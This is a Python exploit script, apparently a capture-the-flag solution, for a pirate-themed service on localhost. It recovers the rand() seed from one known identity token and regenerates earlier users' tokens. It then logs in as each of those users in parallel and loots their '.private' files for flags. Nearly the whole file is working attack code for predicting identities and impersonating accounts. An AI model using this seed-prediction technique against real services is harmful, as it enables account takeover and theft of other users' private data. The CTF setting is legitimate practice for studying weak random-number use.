import ctypes
import re
import socket
from concurrent.futures import ThreadPoolExecutor

directories = [
    "BlackbeardCove",
    "TreasureIsland",
    "SkullAndBonesReef",
    "DeadMansBay",
    "JollyRogersHarbor",
    "BuccaneerBeach",
    "PirateHideout",
    "CutthroatCreek",
    "SirenShores",
    "CorsairCastle",
    "WickedWaters",
    "MaroonersLagoon",
    "ParrotPerch",
    "RumRunnersRidge",
    "GalleonGraveyard"
]

# Load the C standard library
libc = ctypes.CDLL(None)

# Set argument and return types
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int

def generate_identity_string():
    return ''.join(chr(ord('a') + (libc.rand() % 26)) for _ in range(64))

def find_matching_seed(start_seed, target_string, max_attempts_per_seed=640):
    seed = start_seed
    while True:
        libc.srand(seed)
        for attempt in range(max_attempts_per_seed):
            identity_string = generate_identity_string()
            if identity_string == target_string:
                return seed, attempt
        print(f"No match found for seed {seed}")
        seed += 1

# Example starting seed and matching string
start_seed = int(input("Assumed starting time: "))
matching_string = input("String to match: ")
if len(matching_string) != 64:
    print("The matching string must be 64 characters long")
    exit(1)

# Find the seed and offset
found_seed, offset = find_matching_seed(start_seed, matching_string)

print(f"Match found! Seed: {found_seed}, Offset: {offset}")

# Print the 'count' last generated strings, before the match
count = 120
print(f"Prev {count} users might have flags:")

# Seed with found_seed
libc.srand(found_seed)
# generate offset-count strings, which we don't need
for _ in range(max(offset-count, 0)):
    generate_identity_string()
# generate up to count strings
possible_flags_identities = []
for i in range(min(offset, count)):
    value = generate_identity_string()
    possible_flags_identities.append(value)
    print(f"User {offset - min(offset, count) + i}: {value}")

# For each possible flag, try to connect to the server and get the flag
host = 'localhost'
port = 4444

def process_identity(identity):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        # Function to receive data until a certain prompt is found
        def recv_until_prompt(prompt):
            data = b''
            while not data.endswith(prompt):
                data += s.recv(1024)
            return data
    
        # Set identity to possible flag
        s.sendall(b'identity\n')
        recv_until_prompt(b': ')
        s.sendall(identity.encode() + b'\n')
        has_name = recv_until_prompt(b'$ ')

        # Extract username from last response
        scammer_name = has_name.decode().split("\n")[-1].split(":/")[0]
        # split with _ instead of uppercase
        scammer_name = re.sub(r'(?<=[a-z])(?=[A-Z])', '_', scammer_name).lower()

        # Search through all directories for the scammer's name
        potential_files = {}
        for directory in directories:
            s.sendall(f'scout {directory}\n'.encode())
            scout_output = recv_until_prompt(b'$ ').decode()
            if scammer_name in scout_output:
                if directory not in potential_files:
                    potential_files[directory] = []
                file_with_scammer = [line for line in scout_output.split("\n") if scammer_name in line and ".private" in line]
                for file in file_with_scammer:
                    potential_files[directory].append(file)
        
        # Loot the potential files
        for directory, files in potential_files.items():
            s.sendall(f'sail {directory}\n'.encode())
            recv_until_prompt(b'$ ')
            for file in files:
                s.sendall(f'loot {file}\n'.encode())
                response = recv_until_prompt(b'$ ')
                if "Protected with identity hash" in response.decode():
                    print("Flag found!")
                    print(response.decode())
            s.sendall(b'sail ..\n')
            recv_until_prompt(b'$ ')

# Use ThreadPoolExecutor to parallelize the process_identity function
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(process_identity, possible_flags_identities)
